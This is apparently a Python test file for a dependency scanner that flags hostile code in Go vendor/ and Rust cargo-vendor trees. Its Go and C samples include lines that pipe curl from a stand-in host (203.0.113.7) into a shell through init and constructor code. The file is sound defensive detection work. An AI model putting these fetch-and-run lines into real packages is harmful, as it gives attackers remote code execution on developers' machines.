"""--deps reads a Go project's vendor/ and a Rust project's `cargo vendor` tree (0.1.9, Part C).

A vendor directory with a modules.txt (`go mod vendor`) holds the Go modules a build compiles, and one whose crate
directories hold a .cargo-checksum.json (`cargo vendor`) the crates: --deps reads them as the registry reads a module
zip and a .crate (tests/registry/test_package_code.py): the file rules in dependency mode on each .go and .rs file a
build compiles, and the engine's Go reader on each module modules.txt lists (a file of none: its package's directory)
and the Rust reader on each crate, its Cargo.toml read by the engine (vendor.rs) for its build script and library.
Without --deps both trees are pruned, as node_modules is. The npm package's twin is js/test/vendored-code.test.js.

The samples are inert fragments: never built, documentation addresses (203.0.113.x)."""

import os
import shutil
import tempfile
import unittest
from unittest import mock

from lazaret.registry.ecosystems import crates
from lazaret.scanner import _native, core, engine
from tests.registry import test_package_code as samples
from tests.registry._review_support import B64_DATA

MODULES_TXT = ("# example.test/evil v1.0.0\n## explicit; go 1.21\nexample.test/evil\n"
               "# example.test/ok v1.2.0\n## explicit\nexample.test/ok/sub\n")
GO_PROJECT = {"go.mod": "module example.test/app\n\ngo 1.21\n", "main.go": "package main\n\nfunc main() {}\n",
              "vendor/modules.txt": MODULES_TXT}
RUST_PROJECT = {"Cargo.toml": '[package]\nname = "app"\nversion = "0.1.0"\n', "src/main.rs": "fn main() {}\n"}
BLOB = B64_DATA


def go_file(package, text):
    return text.replace("package m", f"package {package}")


def crate(name, files, manifest=None):
    body = {".cargo-checksum.json": '{"files":{},"package":"0"}',
            "Cargo.toml": manifest or f'[package]\nname = "{name}"\nversion = "1.0.0"\n'}
    body.update(files)
    return {f"vendor/{name}/{rel}": text for rel, text in body.items()}


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class VendoredCodeTests(unittest.TestCase):
    def tree(self, files):
        root = tempfile.mkdtemp(prefix="lz-vendor-")
        self.addCleanup(shutil.rmtree, root, True)
        for rel, text in files.items():
            path = os.path.join(root, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text)
        return root

    def scan(self, files, deps=True):
        res = core.scan_project(self.tree(files), include_deps=deps)
        return [(i["rule"], i["sev"], i["file"].replace(os.sep, "/"), i["line"]) for i in res["issues"]
                if i["rule"].startswith(("SC-", "Q-SKIPPED-TREE"))]


class GoVendorTests(VendoredCodeTests):
    def test_init_code_a_vendored_module_runs(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/e.go": go_file("evil", samples.INIT_GO),
                                    "vendor/example.test/ok/sub/s.go": go_file("sub", samples.CLEAN_GO)})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/e.go", 9)])
        self.assertEqual(self.scan(files, deps=False), [("Q-SKIPPED-TREE", "INFO", "vendor", 1)])

    def test_the_rest_of_a_module_and_a_cgo_constructor(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/evil/u.go": go_file("evil", samples.USE_GO),
                                    "vendor/example.test/ok/sub/c.go": go_file("sub", samples.CGO_GO)})
        self.assertEqual(self.scan(files), [("SC-USE-RISK", "CRITICAL", "vendor/example.test/evil/u.go", 6),
                                            ("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/ok/sub/c.go", 5)])
        boot = '__attribute__((constructor)) static void boot(void) { system("curl -s https://203.0.113.7/a.sh | sh"); }\n'
        files = dict(GO_PROJECT, **{"vendor/example.test/ok/sub/s.go": 'package sub\n\n// #include "boot.h"\nimport "C"\n',
                                    "vendor/example.test/ok/sub/boot.h": "#include <stdlib.h>\n" + boot})
        self.assertEqual([r for r, _s, _f, _l in self.scan(files)], ["SC-IMPORT-RISK"])

    def test_a_module_is_read_whole(self):
        # (init in one package of the module reaches a function of another: start-up code, not code run when used)
        files = dict(GO_PROJECT, **{
            "vendor/example.test/evil/e.go": 'package evil\n\nimport "example.test/evil/helper"\n\nfunc init() {\n\thelper.Run()\n}\n',
            "vendor/example.test/evil/helper/h.go": 'package helper\n\nimport "os/exec"\n\nfunc Run() {\n\texec.Command("/bin/sh", '
                                                    '"-c", "curl -s https://203.0.113.7/a.sh | sh").Start()\n}\n'})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/evil/helper/h.go", 6)])

    def test_what_a_build_never_compiles_is_not_read(self):
        bad = go_file("evil", samples.INIT_GO) + f'\nvar blob = "{BLOB}"\n'
        for name in ("e_test.go", "testdata/t.go", "_x.go", ".x.go"):
            with self.subTest(name=name):
                files = dict(GO_PROJECT, **{"vendor/example.test/evil/ok.go": go_file("evil", samples.CLEAN_GO),
                                            f"vendor/example.test/evil/{name}": bad})
                self.assertEqual(self.scan(files), [])

    def test_a_file_of_no_listed_module_is_read_with_its_package(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/other/x/e.go": go_file("x", samples.INIT_GO)})
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/example.test/other/x/e.go", 9)])

    def test_the_file_rules_read_each_file_and_go_generate_is_listed(self):
        files = dict(GO_PROJECT, **{"vendor/example.test/ok/sub/s.go": f'package sub\n\n//go:generate stringer -type=K\n'
                                                                       f'var blob = "{BLOB}"\n'})
        self.assertEqual([(r, s) for r, s, _f, _l in self.scan(files)], [("SC-B64", "MAJOR"), ("SC-GO-GENERATE", "INFO")])


class CargoVendorTests(VendoredCodeTests):
    def test_a_build_script_and_a_procedural_macro(self):
        files = dict(RUST_PROJECT, **crate("buildevil", {"build.rs": samples.BUILD_RS, "src/lib.rs": samples.CLEAN_RS}),
                     **crate("macro", {"src/lib.rs": samples.MACRO_RS},
                             '[package]\nname = "macro"\nversion = "1.0.0"\n\n[lib]\nproc-macro = true\n'),
                     **crate("fine", {"src/lib.rs": samples.CLEAN_RS}))
        self.assertEqual(self.scan(files), [("SC-INSTALL-HOOK", "CRITICAL", "vendor/buildevil/build.rs", 5),
                                            ("SC-INSTALL-HOOK", "CRITICAL", "vendor/macro/src/lib.rs", 5)])
        self.assertEqual(self.scan(files, deps=False), [("Q-SKIPPED-TREE", "INFO", "vendor", 1)])
        # a library whose crate types hold "proc-macro" is one too
        files = dict(RUST_PROJECT, **crate("macro", {"src/lib.rs": samples.MACRO_RS},
                                           '[package]\nname = "macro"\nversion = "1.0.0"\n\n[lib]\ncrate-type = ["proc-macro"]\n'))
        self.assertEqual(self.scan(files), [("SC-INSTALL-HOOK", "CRITICAL", "vendor/macro/src/lib.rs", 5)])

    def test_the_manifest_says_which_build_script(self):
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = "tools/gen.rs"\n'
        files = dict(RUST_PROJECT, **crate("c", {"tools/gen.rs": samples.BUILD_RS, "src/lib.rs": samples.CLEAN_RS}, manifest))
        self.assertEqual([(r, f) for r, _s, f, _l in self.scan(files)], [("SC-INSTALL-HOOK", "vendor/c/tools/gen.rs")])
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = false\n'
        files = dict(RUST_PROJECT, **crate("c", {"build.rs": samples.BUILD_RS, "src/lib.rs": samples.CLEAN_RS}, manifest))
        self.assertEqual(self.scan(files), [])

    def test_a_ctor_and_code_run_when_used(self):
        files = dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CTOR_RS}), **crate("d", {"src/lib.rs": samples.USE_RS}))
        self.assertEqual(self.scan(files), [("SC-IMPORT-RISK", "CRITICAL", "vendor/c/src/lib.rs", 3),
                                            ("SC-USE-RISK", "CRITICAL", "vendor/d/src/lib.rs", 2)])

    def test_tests_benches_and_examples_are_not_read(self):
        bad = samples.CTOR_RS + f'pub const K: &str = "{BLOB}";\n'
        for name in ("tests/t.rs", "benches/b.rs", "examples/e.rs"):
            with self.subTest(name=name):
                files = dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CLEAN_RS, name: bad}))
                self.assertEqual(self.scan(files), [])

    def test_a_vendor_directory_that_is_not_cargo_s_is_the_project_s(self):
        files = dict(RUST_PROJECT, **{"vendor/y/src/lib.rs": samples.CLEAN_RS + f'pub const K: &str = "{BLOB}";\n'})
        self.assertEqual(self.scan(files, deps=False), [("SC-B64", "MAJOR", "vendor/y/src/lib.rs", 2)])
        root = self.tree(dict(RUST_PROJECT, **{"elsewhere.json": "{}", "vendor/y/src/lib.rs": samples.CTOR_RS}))
        os.symlink(os.path.join(root, "elsewhere.json"), os.path.join(root, "vendor", "y", ".cargo-checksum.json"))
        self.assertIsNone(core._vendor_kind(os.path.join(root, "vendor")))      # (a link is not cargo's file)

    def test_a_crate_too_large_or_unanswered_is_not_cleared(self):
        files = dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CLEAN_RS}))
        with mock.patch.object(core, "PACKAGE_CODE_CHARS", 10):
            self.assertEqual([(r, s, f) for r, s, f, _l in self.scan(files)], [("SC-TRUNCATED", "CRITICAL", "vendor/c/src/lib.rs")])
        with mock.patch.object(engine, "rs_crate", side_effect=_native.NativeError("boom")):
            self.assertEqual([r for r, _s, _f, _l in self.scan(files)], ["SC-TRUNCATED"])

    def test_the_readers_stop_when_asked(self):
        root = self.tree(dict(RUST_PROJECT, **crate("c", {"src/lib.rs": samples.CTOR_RS})))
        col = core._collect(root, include_deps=True)
        tree = core._DependencyTree(root, col["files"], col["manifests"], ())
        self.assertEqual(core._vendored_code(tree, col["files"], should_stop=lambda: "the budget"), ([], "the budget"))
        found, stopped = core._vendored_code(tree, col["files"])
        self.assertEqual(([i["rule"] for i in found], stopped), (["SC-IMPORT-RISK"], None))


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class ManifestTests(unittest.TestCase):
    MANIFESTS = (
        "",
        '[package]\nname = "x"\nversion = "1.0.0"\n',
        '[package]\nname = "x"\nbuild = "build.rs"\n\n[lib]\nname = "x"\npath = "src/lib.rs"\nproc-macro = true\n',
        '[package]\nbuild = false\n',
        "[project]\nbuild = 'tools/gen.rs'\n",
        'package.build = "tools/gen.rs"\nlib.path = "src/x.rs"\nlib."proc-macro" = true\n',
        'lib = { path = "src/x.rs", proc-macro = true }\npackage = { build = "./tools/gen.rs" }\n',
        '[package]\ndescription = """\n[lib]\nproc-macro = true\n"""\nkeywords = [\n "a", [1, [2]],\n]\nbuild = "tools/gen.rs"\n',
        '[package]\nname = "x"\n[[bin]]\npath = "src/x.rs"\n[target.\'cfg(unix)\'.dependencies]\nbuild = "no.rs"\n',
        '[lib]\nproc_macro = true\npath = "/src/x.rs"\n',
        '[lib]\npath = "../outside.rs"\n',
        # crate-type = ["proc-macro"]: a procedural macro to cargo, proc-macro = false or not
        '[lib]\ncrate-type = ["proc-macro"]\n',
        'lib = { crate_type = [ "proc-macro" ], path = "src/x.rs" }\n',
        '[lib]\nproc-macro = false\ncrate-type = [\n  "proc-macro",\n]\n',
        '[lib]\ncrate-type = ["rlib", "cdylib"]\n',
    )
    MEMBERS = ("build.rs", "tools/gen.rs", "src/lib.rs", "src/x.rs")

    def test_the_engine_reads_a_manifest_as_the_registry_does(self):
        # (the registry reads a .crate's Cargo.toml with Python's TOML reader; --deps, and the npm package, with the
        # engine's: the same answers on what cargo writes and on the other ways TOML says it)
        for text in self.MANIFESTS:
            with self.subTest(text=text):
                self.assertEqual(core.cargo_layout(text, self.MEMBERS),
                                 crates.ECOSYSTEM.layout({"Cargo.toml": text}, self.MEMBERS))

    def test_what_the_engine_answers(self):
        self.assertEqual(engine.cargo_layout('[package]\nbuild = false\n[lib]\npath = "l.rs"\n'),
                         {"build": False, "lib": "l.rs", "proc_macro": None})
        self.assertEqual(engine.cargo_layout(""), {"build": None, "lib": None, "proc_macro": None})
        self.assertEqual(engine.go_vendored_modules(MODULES_TXT), ["example.test/evil", "example.test/ok"])
        self.assertEqual(core._vendored_modules(None), [])


if __name__ == "__main__":
    unittest.main()
